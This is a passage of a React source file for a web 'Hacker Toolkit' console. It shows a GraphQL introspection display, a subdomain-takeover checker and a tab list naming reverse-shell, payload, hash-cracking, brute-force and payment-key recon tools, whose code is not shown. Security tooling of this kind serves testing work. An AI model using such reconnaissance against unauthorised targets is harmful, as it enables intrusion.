            <p className="font-heading text-sm font-semibold" style={{ color: res.introspection_enabled ? "#F97316" : "#22C55E" }}>{res.introspection_enabled ? "Introspection ENABLED" : "Introspection disabled"}</p>
          </div>
          {res.introspection_enabled && (
            <>
              <div className="bg-[#121212] border border-border p-4 grid sm:grid-cols-3 gap-2 font-mono text-xs">
                <span><span className="text-zinc-500">query </span><span className="text-primary">{res.query_type || "—"}</span></span>
                <span><span className="text-zinc-500">mutation </span><span className="text-primary">{res.mutation_type || "—"}</span></span>
                <span><span className="text-zinc-500">types </span><span className="text-primary">{res.type_count}</span></span>
              </div>
              <div className="bg-[#121212] border border-border p-4">
                <p className="data-label mb-2">Schema types</p>
                <div className="flex flex-wrap gap-1.5 max-h-72 overflow-auto">
                  {res.types.map((t) => <span key={t} className="font-mono text-[10px] border border-border px-1.5 py-0.5 text-zinc-300">{t}</span>)}
                </div>
              </div>
            </>
          )}
          {res.note && <p className="text-xs text-zinc-500 font-mono">{res.note}</p>}
        </div>
      )}
    </div>
  );
}

/* ==================== Subdomain Takeover Check ==================== */
function TakeoverTab() {
  const [host, setHost] = useState(""); const [busy, setBusy] = useState(false); const [res, setRes] = useState(null);
  const run = async (e) => { e.preventDefault(); if (!host.trim()) return toast.error("Enter a host"); setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/takeover", { host: host.trim() }); setRes(data); toast[data.vulnerable ? "error" : "success"](data.vulnerable ? "Potential takeover!" : "No takeover detected"); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Failed"); } finally { setBusy(false); } };
  return (
    <div className="space-y-4" data-testid="takeover-panel">
      <p className="text-xs text-zinc-500 font-mono">Detect subdomain-takeover risk — checks dangling CNAMEs pointing to unclaimed cloud services (GitHub Pages, S3, Heroku, Netlify…).</p>
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={host} onChange={(e) => setHost(e.target.value)} data-testid="takeover-input" placeholder="sub.example.com" />
        <button className={btnCls} disabled={busy} data-testid="takeover-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <GitBranch className="w-4 h-4" />} Check</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="takeover-result">
          <div className="border p-3 flex items-center gap-2" style={{ borderColor: res.vulnerable ? "#EF444466" : "#22C55E66", background: res.vulnerable ? "#EF444414" : "#22C55E14" }}>
            {res.vulnerable ? <ShieldAlert className="w-5 h-5 text-severity-critical" /> : <ShieldCheck className="w-5 h-5 text-emerald-400" />}
            <p className="font-heading text-sm font-semibold" style={{ color: res.vulnerable ? "#EF4444" : "#22C55E" }}>{res.vulnerable ? "POTENTIAL TAKEOVER — dangling resource" : "No takeover fingerprint matched"}</p>
          </div>
          <div className="bg-[#121212] border border-border p-4 font-mono text-xs space-y-1">
            <div><span className="text-zinc-500">host </span><span className="text-white">{res.host}</span></div>
            <div><span className="text-zinc-500">CNAMEs </span><span className="text-zinc-300 break-all">{res.cnames.length ? res.cnames.join(" → ") : "none"}</span></div>
            <div><span className="text-zinc-500">http </span><span className="text-zinc-300">{res.http_status || "unreachable"}</span></div>
          </div>
          {res.matches?.length > 0 && (
            <div className="space-y-1.5">
              {res.matches.map((m, i) => (
                <div key={i} className="flex items-start gap-2 border-l-2 pl-3 py-1 text-xs" style={{ borderColor: m.fingerprint ? "#EF4444" : "#F59E0B" }}>
                  <span className="font-bold" style={{ color: m.fingerprint ? "#EF4444" : "#F59E0B" }}>{m.service}</span>
                  <span className="text-zinc-400">{m.fingerprint ? `matched fingerprint "${m.fingerprint}"` : m.note}</span>
                </div>
              ))}
            </div>
          )}
          {res.note && <p className="text-xs text-zinc-500 font-mono">{res.note}</p>}
        </div>
      )}
    </div>
  );
}


const TABS = [
  { v: "encoders", icon: Binary, label: "Encoders", C: EncoderTab },
  { v: "cipher", icon: Shuffle, label: "Cipher Lab", C: CipherTab },
  { v: "hashing", icon: Hash, label: "Hashing", C: HashTab },
  { v: "hashcrack", icon: Unlock, label: "Hash Cracker", C: HashCrackTab },
  { v: "jwt", icon: KeyRound, label: "JWT", C: JwtTab },
  { v: "password", icon: Lock, label: "Password", C: PasswordTab },
  { v: "revshell", icon: Terminal, label: "Reverse Shell", C: ReverseShellTab },
  { v: "payloads", icon: Bug, label: "Payloads", C: PayloadTab },
  { v: "cve", icon: Database, label: "CVE Search", C: CveTab },
  { v: "dns", icon: Globe, label: "DNS / WHOIS", C: DnsTab },
  { v: "emaildns", icon: AtSign, label: "Email/DNS Sec", C: EmailDnsTab },
  { v: "subdomain", icon: Waypoints, label: "Subdomains", C: SubdomainTab },
  { v: "takeover", icon: GitBranch, label: "Takeover", C: TakeoverTab },
  { v: "portscan", icon: Radar, label: "Port Scan", C: PortScanTab },
  { v: "dirscan", icon: FolderSearch, label: "Dir Bruteforce", C: DirScanTab },
  { v: "fingerprint", icon: Fingerprint, label: "Tech/WAF", C: FingerprintTab },
  { v: "reqbuilder", icon: Send, label: "Request Builder", C: RequestBuilderTab },
  { v: "cors", icon: Globe2, label: "CORS Test", C: CorsTab },
  { v: "graphql", icon: Braces, label: "GraphQL", C: GraphqlTab },
  { v: "httpinspect", icon: ServerCog, label: "HTTP + TLS", C: HttpInspectTab },
  { v: "subnet", icon: Network, label: "Subnet Calc", C: SubnetTab },
  { v: "dork", icon: ScanSearch, label: "Dork Generator", C: DorkTab },
  { v: "imei", icon: Smartphone, label: "IMEI Info", C: ImeiTab },
  { v: "paykeys", icon: CreditCard, label: "Payment Key Recon", C: KeyReconTab },
];

export default function Toolkit() {
  return (
    <div className="p-5 md:p-8 space-y-6" data-testid="toolkit-page">
      <div className="flex items-start gap-4">
        <div className="w-12 h-12 border border-border bg-[#121212] flex items-center justify-center shrink-0 glow-primary"><Wrench className="w-6 h-6 text-primary" /></div>
        <div>
          <p className="data-label mb-1">/ Utilities</p>
          <h1 className="font-heading text-2xl md:text-3xl font-bold">Hacker Toolkit</h1>
          <p className="text-sm text-zinc-500 mt-1">Encoders, cipher lab, hashing &amp; hash cracking, JWT, password analysis, reverse-shell generator, payloads, live CVE search, DNS/WHOIS, HTTP+TLS inspector, subnet calculator, dork generator, IMEI info and payment-key recon — in one console.</p>
        </div>
      </div>

      <Tabs defaultValue="encoders" className="w-full">
        <TabsList className="bg-[#121212] border border-border p-1 h-auto flex-wrap justify-start" data-testid="toolkit-tabs">
          {TABS.map((t) => (
            <TabsTrigger key={t.v} value={t.v} data-testid={`toolkit-tab-${t.v}`} className="data-[state=active]:bg-primary data-[state=active]:text-black gap-2 px-4 py-2">
              <t.icon className="w-4 h-4" /> {t.label}
            </TabsTrigger>
          ))}
        </TabsList>
        <div className="mt-5">
          {TABS.map((t) => <TabsContent key={t.v} value={t.v}><t.C /></TabsContent>)}
        </div>
      </Tabs>
    </div>
  );
}
